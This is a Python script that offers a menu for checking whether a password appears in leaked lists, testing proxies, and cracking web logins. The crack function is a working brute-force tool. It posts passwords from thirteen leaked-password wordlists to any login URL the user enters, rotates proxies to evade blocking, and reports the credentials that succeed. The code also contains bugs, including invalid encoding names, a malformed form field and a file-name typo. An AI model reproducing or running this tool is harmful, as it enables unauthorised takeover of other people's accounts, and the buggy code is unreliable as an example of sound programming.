import requests
import certifi

try:
	a = open('password/a.txt', 'r', encoding='utf-8')
	c_a = a.read().split('\n')
except UnicodeDecodeError:
	a = open('password/a.txt', 'r', encoding='utf-8', errors='replace')
	c_a = a.read().split('\n')

try:
	b = open('password/b.txt', 'r', encoding='utf-8')
	c_b = b.read().split('\n')
except UnicodeDecodeError:
	b = open('password/b.txt', 'r', encoding='utf-8', errors='replace=')
	c_b = b.read().split('\n')

try:
	c = open('password/c.txt', 'r', encoding='utf-8')
	c_c = c.read().split('\n')
except UnicodeDecodeError:
	c = open('password/c.txt', 'r', encoding='utf-8', errors='replace')
	c_c = c.read().split('\n')

try:
	d = open('password/d.txt', 'r', encoding='utf-8')
	c_d = d.read().split('\n')
except UnicodeDecodeError:
	d = open('password/d.txt', 'r', encoding='utf-8', errors='replace')
	c_d = d.read().split('\n')

try:		
	e = open('password/e.txt', 'r', encoding='utf-8')
	c_e = e.read().split('\n')
except UnicodeDecodeError:
	e = open('password/e.txt', 'r', encoding='replace', errors='replace')
	c_e = e.read().split('\n')

try:
	f = open('password/f.txt', 'r', encoding='utf-8')
	c_f = f.read().split('\n')
except UnicodeDecodeError:
	f = open('password/f.txt', 'r', encoding='replace', errors='replace')
	c_f = f.read().split('\n')

try:
	g = open('password/g.txt', 'r', encoding='utf-8')
	c_g = g.read().split('\n')
except UnicodeDecodeError:
	g = open('password/g.tx', 'r', encoding='utf-8', errors='replace')
	c_g = g.read().split('\n')

try:
	h = open('password/h.txt', 'r', encoding='utf-8')
	c_h = h.read().split('\n')
except UnicodeDecodeError:
	h = open('password/h.txt', 'r', encoding='utf-8', errors='replace')
	c_h = h.read().split('\n')

try:
	i = open('password/i.txt', 'r', encoding='utf-8')
	c_i = i.read().split('\n')
except UnicodeDecodeError:
	i = open('password/i.txt', 'r', encoding='utf-8', errors='replace')
	c_i = i.read().split('\n')

try:
	j = open('password/j.txt', 'r', encoding='utf-8')
	c_j = j.read().split('\n')
except UnicodeDecodeError:
	j = open('password/j.txt', 'r', encoding='utf-8', errors='replace')
	c_j = j.read().split('\n')
try:
	k = open('password/k.txt', 'r', encoding='utf-8')
	c_k = k.read().split('\n')
except UnicodeDecodeError:
	k = open('password/k.txt', 'r', encoding='utf-8', errors='replace')
	c_k = k.read().split('\n')
try:
	l = open('password/l.txt', 'r', encoding='utf-8')
	c_l = l.read().split('\n')
except UnicodeDecodeError:
	l = open('password/l.txt', 'r', encoding='utf-8', errors='replace')
	c_l = l.read().split('\n')

try:
	m = open('password/m.txt', 'r', encoding='utf-8')
	c_m = m.read().split('\n')
except UnicodeDecodeError:
	m = open('password/m.txt', 'r', encoding='utf-8', errors='replace')
	c_m = m.read().split('\n')

#### Proxy server #####

######### I remommanded to use other better proxy servers.But it's 'OK' to use default ###############
def web_scrap():


	usr_proxy = str(input("Enter proxy server ('Enter' to use default) > "))

	try:
		with open(usr_proxy, 'r') as f:
			print(f'[ Loading proxy server {usr_proxy} ]\n')
			proxies = f.read().split('\n')
	except FileNotFoundError:
		print(f'No proxy server found named {usr_proxy}\n')
		with open('proxies/valid_proxies.txt', 'r') as f:
			print('[ Loading default proxy server ]\n')
			proxies = f.read().split('\n')


	site_to_check = ["http://webscraper.io/test-sites"]

	counter = 0

	for site in site_to_check:
		try:
			print(f"Using the proxy [{proxies[counter]}]")
			res = requests.get(site, proxies={'http': proxies[counter],
											'https': proxies[counter]})
			print(res.status_code)
		except:
			print("Failed")
		finally:
			counter += 1

########################## Crack ############################

def crack():

	ca_bundle = certifi.where()

	#### section 'm' #####

	check = False
	usr_proxy = str(input("Enter proxy server ('Enter' to use default) > "))

	try:
		with open(usr_proxy, 'r') as f:
			print(f'[ Loading proxy server {usr_proxy} ]\n')
			proxies = f.read().split('\n')
	except FileNotFoundError:
		print(f'No proxy server found named {usr_proxy}\n')
		with open('proxies/valid_proxies.txt', 'r') as f:
			print('[ Loading default proxy server ]\n')
			proxies = f.read().split('\n')
	
	login_url = str(input('Enter Web Login URL > '))
	usr_name = input('\nEnter User Name or email > ')
	
	counter = 0

	#### section 'a' #####
	for i, p_a in enumerate(c_a):
		password = p_a
		payload = {'\nusername':usr_name, 'password':password}
		try:
			print(f"Using the proxy [{proxies[counter]}]")
			res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																	'https': proxies[counter]}, verify=ca_bundle)
			if res.status_code == 200:
				check = True
				break
				
		except Exception as e:
			print(f"Failed! Error code: {e}")
		
		counter += 1
		if counter == len(proxies):
			print("All proxies have been tried without success")
			break

	if check:
		print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
	else:
		#### section 'b' #####
		for i, p_b in enumerate(c_b):
			password = p_b
			payload = {'\nusername':usr_name, 'password':password}
			try:
				print(f"Using the proxy [{proxies[counter]}]")
				res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																		'https': proxies[counter]}, verify=ca_bundle)
				if res.status_code == 200:
					check = True
					break
					
			except Exception as e:
				print(f"Failed! Error code: {e}")
			
			counter += 1
			if counter == len(proxies):
				print("All proxies have been tried without success")
				break

		if check:
			print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
		else:
			#### section 'c' #####
			for i, p_c in enumerate(c_c):
				password = p_c
				payload = {'\nusername':usr_name, 'password':password}
				try:
					print(f"Using the proxy [{proxies[counter]}]")
					res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																			'https': proxies[counter]}, verify=ca_bundle)
					if res.status_code == 200:
						check = True
						break
						
				except Exception as e:
					print(f"Failed! Error code: {e}")
				
				counter += 1
				if counter == len(proxies):
					print("All proxies have been tried without success")
					break

			if check:
				print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')

			else:
				#### section 'd' #####
				for i, p_d in enumerate(c_d):
					password = p_d
					payload = {'\nusername':usr_name, 'password':password}
					try:
						print(f"Using the proxy [{proxies[counter]}]")
						res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																				'https': proxies[counter]}, verify=ca_bundle)
						if res.status_code == 200:
							check = True
							break
							
					except Exception as e:
						print(f"Failed! Error code: {e}")
					
					counter += 1
					if counter == len(proxies):
						print("All proxies have been tried without success")
						break

				if check:
					print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')

				else:
					#### section 'e' #####
					for i, p_e in enumerate(c_e):
						password = p_e
						payload = {'\nusername':usr_name, 'password':password}
						try:
							print(f"Using the proxy [{proxies[counter]}]")
							res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																					'https': proxies[counter]}, verify=ca_bundle)
							if res.status_code == 200:
								check = True
								break
								
						except Exception as e:
							print(f"Failed! Error code: {e}")
						
						counter += 1
						if counter == len(proxies):
							print("All proxies have been tried without success")
							break

					if check:
						print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
					else:
						#### section 'f' #####
						for i, p_f in enumerate(c_f):
							password = p_f
							payload = {'\nusername':usr_name, 'password':password}
							try:
								print(f"Using the proxy [{proxies[counter]}]")
								res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																						'https': proxies[counter]}, verify=ca_bundle)
								if res.status_code == 200:
									check = True
									break
									
							except Exception as e:
								print(f"Failed! Error code: {e}")
							
							counter += 1
							if counter == len(proxies):
								print("All proxies have been tried without success")
								break

						if check:
							print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
						else:
							#### section 'g' #####
							for i, p_g in enumerate(c_g):
								password = p_g
								payload = {'\nusername':usr_name, 'password':password}
								try:
									print(f"Using the proxy [{proxies[counter]}]")
									res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																							'https': proxies[counter]}, verify=ca_bundle)
									if res.status_code == 200:
										check = True
										break
										
								except Exception as e:
									print(f"Failed! Error code: {e}")
								
								counter += 1
								if counter == len(proxies):
									print("All proxies have been tried without success")
									break

							if check:
								print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
							else:
								#### section 'h' #####
								for i, p_h in enumerate(c_h):
									password = p_h
									payload = {'\nusername':usr_name, 'password':password}
									try:
										print(f"Using the proxy [{proxies[counter]}]")
										res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																								'https': proxies[counter]}, verify=ca_bundle)
										if res.status_code == 200:
											check = True
											break
											
									except Exception as e:
										print(f"Failed! Error code: {e}")
									
									counter += 1
									if counter == len(proxies):
										print("All proxies have been tried without success")
										break

								if check:
									print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
								else:
									#### section 'i' #####
									for i, p_i in enumerate(c_i):
										password = p_i
										payload = {'\nusername':usr_name, 'password':password}
										try:
											print(f"Using the proxy [{proxies[counter]}]")
											res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																									'https': proxies[counter]}, verify=ca_bundle)
											if res.status_code == 200:
												check = True
												break
												
										except Exception as e:
											print(f"Failed! Error code: {e}")
										
										counter += 1
										if counter == len(proxies):
											print("All proxies have been tried without success")
											break

									if check:
										print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
									else:
										#### section 'j' #####
										for i, p_j in enumerate(c_j):
											password = p_j
											payload = {'\nusername':usr_name, 'password':password}
											try:
												print(f"Using the proxy [{proxies[counter]}]")
												res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																										'https': proxies[counter]}, verify=ca_bundle)
												if res.status_code == 200:
													check = True
													break
													
											except Exception as e:
												print(f"Failed! Error code: {e}")
											
											counter += 1
											if counter == len(proxies):
												print("All proxies have been tried without success")
												break

										if check:
											print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
										else:
											#### section 'k' #####
											for i, p_k in enumerate(c_k):
												password = p_k
												payload = {'\nusername':usr_name, 'password':password}
												try:
													print(f"Using the proxy [{proxies[counter]}]")
													res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																											'https': proxies[counter]}, verify=ca_bundle)
													if res.status_code == 200:
														check = True
														break
														
												except Exception as e:
													print(f"Failed! Error code: {e}")
												
												counter += 1
												if counter == len(proxies):
													print("All proxies have been tried without success")
													break

											if check:
												print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
											else:
												for i, p_l in enumerate(c_l):
													password = p_l
													payload = {'\nusername':usr_name, 'password':password}
													try:
														print(f"Using the proxy [{proxies[counter]}]")
														res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																												'https': proxies[counter]}, verify=ca_bundle)
														if res.status_code == 200:
															check = True
															break
															
													except Exception as e:
														print(f"Failed! Error code: {e}")
													
													counter += 1
													if counter == len(proxies):
														print("All proxies have been tried without success")
														break

												if check:
													print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
												else:
													for i, p_m in enumerate(c_m):
														password = p_m
														payload = {'\nusername':usr_name, 'password':password}
														try:
															print(f"Using the proxy [{proxies[counter]}]")
															res = requests.post(login_url, data=payload, proxies={'http': proxies[counter],
																													'https': proxies[counter]}, verify=ca_bundle)
															if res.status_code == 200:
																check = True
																break
																
														except Exception as e:
															print(f"Failed! Error code: {e}")
														
														counter += 1
														if counter == len(proxies):
															print("All proxies have been tried without success")
															break

													if check:
														print(f'\nLogin successful! Email :: [{usr_name}] Password :: [{password}]')
													else:
														print('Out of list of passwords.')

######################### Check Password #########################

def check_your_pass():
	print('Lets crack')
	flag1 = False
	flag2 = False
	flag3 = False
	flag4 = False
	flag5 = False
	flag6 = False
	flag7 = False
	flag8 = False
	flag9 = False
	flag10 = False
	flag11 = False
	flag12 = False
	flag13 = False


	user_p = input("Enter password > ")

	#### section 'a' #####
	for i, p_a in enumerate(c_a):
		if user_p == p_a:
			flag1 = True
	#### section 'b' #####
	for i, p_b in enumerate(c_b):
		if user_p == p_b:
			flag2 = True
	#### section 'c' #####
	for i, p_c in enumerate(c_c):
		if user_p == p_c:
			flag3 = True
	#### section 'd' #####
	for i, p_d in enumerate(c_d):
		if user_p == p_d:
			flag4 = True
	#### section 'e' #####
	for i, p_e in enumerate(c_e):
		if user_p == p_e:
			flag5 = True
	#### section 'f' #####
	for i, p_f in enumerate(c_f):
		if user_p == p_f:
			flag6 = True
	#### section 'g' #####
	for i, p_g in enumerate(c_g):
		if user_p == p_g:
			flag7 = True
	#### section 'h' #####
	for i, p_h in enumerate(c_h):
		if user_p == p_h:
			flag8 = True
	#### section 'i' #####
	for i, p_i in enumerate(c_i):
		if user_p == p_i:
			flag9 = True
	#### section 'j' #####
	for i, p_j in enumerate(c_j):
		if user_p == p_j:
			flag10 = True

	#### section 'k' #####
	for i, p_k in enumerate(c_k):
		if user_p == p_k:
			flag11 = True

	#### section 'l' #####
	for i, p_l in enumerate(c_l):
		if user_p == p_l:
			flag12 = True

	#### section 'm' #####
	for i, p_m in enumerate(c_m):
		if user_p == p_m:
			flag13 = True

	if flag1 or flag2 or flag3 or flag4 or flag5 or flag6 or flag7 or flag8 or flag9 or flag10 or flag11 or flag12 or flag13:
		print('[Your password was already leaked. Please Chandge it now.]')

	else:
		print(f'Your password [{user_p}] is safe.')



def menu():
	usr_c = input("""
		[ OPTIONS ]
		[1] Check your password weather if is it already leak or still safe.
		[2] Crack password
		[3] Web Scrapping
		[> """)
	if usr_c == '1':
		check_your_pass()
	elif usr_c == '2':
		crack()
	elif usr_c == '3':
		web_scrap()


menu()